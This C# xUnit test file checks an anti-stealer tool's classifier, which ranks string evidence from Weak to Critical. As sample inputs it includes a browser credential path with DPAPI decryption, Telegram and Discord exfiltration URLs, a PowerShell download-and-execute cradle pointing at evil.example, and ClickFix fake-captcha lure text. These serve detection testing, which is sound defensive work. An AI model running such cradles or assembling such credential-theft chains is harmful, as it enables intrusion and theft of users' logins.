using System.Collections.Generic;
using System.Linq;
using AntiStealerOneExe;
using Xunit;

namespace AntiStealer.Tests;

/// <summary>
/// B16 — tiered facts (Weak / Medium / Strong / Critical).
///
/// These regression tests pin the classifier so a future detector
/// change cannot silently demote a Critical chain into a Weak hit,
/// or promote a single keyword to Critical.
/// </summary>
public class TieredFactsTests
{
    [Fact]
    public void B16_BareKeyword_ClassifiedAsWeak_Only()
    {
        var r = new AnalysisResult("/synthetic/b16-keyword.bin");
        r.StringHits.Add("chrome is a popular browser");
        r.StringHits.Add("wallet management page");
        TieredFactClassifier.Classify(r);

        var weak = r.TieredFacts.Where(f => f.Strength == FactStrength.Weak).ToList();
        Assert.Contains(weak, f => f.Category == "keyword.browser");
        Assert.Contains(weak, f => f.Category == "keyword.wallet");
        Assert.DoesNotContain(r.TieredFacts, f => f.Strength >= FactStrength.Medium);
    }

    [Fact]
    public void B16_FullBrowserPath_ClassifiedAsMedium()
    {
        var r = new AnalysisResult("/synthetic/b16-path.bin");
        r.StringHits.Add(@"C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Login Data");
        TieredFactClassifier.Classify(r);

        var med = r.TieredFacts.Where(f => f.Strength == FactStrength.Medium).ToList();
        Assert.NotEmpty(med);
        Assert.Contains(med, f => f.Category.StartsWith("browser."));
        Assert.DoesNotContain(r.TieredFacts, f => f.Strength == FactStrength.Strong);
        Assert.DoesNotContain(r.TieredFacts, f => f.Strength == FactStrength.Critical);
    }

    [Fact]
    public void B16_PathPlusCollectionCapability_ClassifiedAsStrong()
    {
        var r = new AnalysisResult("/synthetic/b16-strong.bin");
        r.StringHits.Add(@"AppData\Local\Google\Chrome\User Data\Default\Login Data");
        r.StringHits.Add("CryptUnprotectData");
        TieredFactClassifier.Classify(r);

        var strong = r.TieredFacts.Where(f => f.Strength == FactStrength.Strong).ToList();
        Assert.NotEmpty(strong);
        Assert.Contains(strong, f => f.Evidence.Contains("path+collection"));
        Assert.DoesNotContain(r.TieredFacts, f => f.Strength == FactStrength.Critical);
    }

    [Fact]
    public void B16_FullChainWithExfilSink_ClassifiedAsCritical()
    {
        var r = new AnalysisResult("/synthetic/b16-critical.bin");
        r.StringHits.Add(@"AppData\Local\Google\Chrome\User Data\Default\Login Data");
        r.StringHits.Add("CryptUnprotectData");
        r.UrlsFound.Add("https://api.telegram.org/bot7777:AAA/sendMessage");
        TieredFactClassifier.Classify(r);

        var crit = r.TieredFacts.Where(f => f.Strength == FactStrength.Critical).ToList();
        Assert.NotEmpty(crit);
        Assert.Contains(crit, f => f.Evidence.Contains("path+collection+exfil"));
    }

    [Fact]
    public void B16_AppliedFloorsBecomeCriticalFacts()
    {
        var r = new AnalysisResult("/synthetic/b16-floor.bin");
        r.AppliedFloors.Add("BrowserDbDpapiExfil");
        r.AppliedFloors.Add("DecisiveTelegramStealer");
        TieredFactClassifier.Classify(r);

        var crit = r.TieredFacts.Where(f => f.Strength == FactStrength.Critical &&
                                            f.Category == "floor").ToList();
        Assert.Equal(2, crit.Count);
    }

    [Fact]
    public void B16_PowerShellEncodedCradle_ClassifiedAsCritical_OnlyWithUrl()
    {
        var rNoUrl = new AnalysisResult("/synthetic/b16-ps-no-url.ps1");
        rNoUrl.StringHits.Add("powershell -EncodedCommand abc");
        rNoUrl.StringHits.Add("Invoke-Expression $cmd");
        TieredFactClassifier.Classify(rNoUrl);
        // Without a URL the cradle is Strong, not Critical.
        Assert.Contains(rNoUrl.TieredFacts,
            f => f.Strength == FactStrength.Strong && f.Category == "execution.ps_cradle");
        Assert.DoesNotContain(rNoUrl.TieredFacts,
            f => f.Strength == FactStrength.Critical && f.Category == "execution.ps_cradle");

        var rUrl = new AnalysisResult("/synthetic/b16-ps-url.ps1");
        rUrl.StringHits.Add("powershell -EncodedCommand abc");
        rUrl.StringHits.Add("IEX (New-Object Net.WebClient).DownloadString('http://x')");
        rUrl.UrlsFound.Add("http://evil.example/loader.ps1");
        TieredFactClassifier.Classify(rUrl);
        Assert.Contains(rUrl.TieredFacts,
            f => f.Strength == FactStrength.Critical && f.Category == "execution.ps_cradle");
    }

    [Fact]
    public void B16_Idempotent_DoubleClassify_DoesNotDoubleCount()
    {
        var r = new AnalysisResult("/synthetic/b16-idempotent.bin");
        r.StringHits.Add("chrome");
        TieredFactClassifier.Classify(r);
        int first = r.TieredFacts.Count;
        TieredFactClassifier.Classify(r);
        Assert.Equal(first, r.TieredFacts.Count);
    }

    [Fact]
    public void B16_ClickFix_FakeCaptchaPlusWinR_ClassifiedAsStrong()
    {
        var r = new AnalysisResult("/synthetic/b16-clickfix.html");
        r.StringHits.Add("Please verify you are human by pressing Win+R and Ctrl+V");
        r.StringHits.Add("captcha-check completed");
        TieredFactClassifier.Classify(r);
        Assert.Contains(r.TieredFacts,
            f => f.Strength == FactStrength.Strong && f.Category == "social.clickfix");
    }

    [Fact]
    public void B16_HelperCounters_AreAccurate()
    {
        var r = new AnalysisResult("/synthetic/b16-helpers.bin");
        r.StringHits.Add(@"AppData\Local\Google\Chrome\User Data\Default\Login Data");
        r.StringHits.Add("CryptUnprotectData");
        r.UrlsFound.Add("https://discord.com/api/webhooks/123/abc");
        TieredFactClassifier.Classify(r);
        Assert.True(TieredFactClassifier.Count(r, FactStrength.Critical) >= 1);
        Assert.NotEmpty(TieredFactClassifier.Critical(r));
    }
}
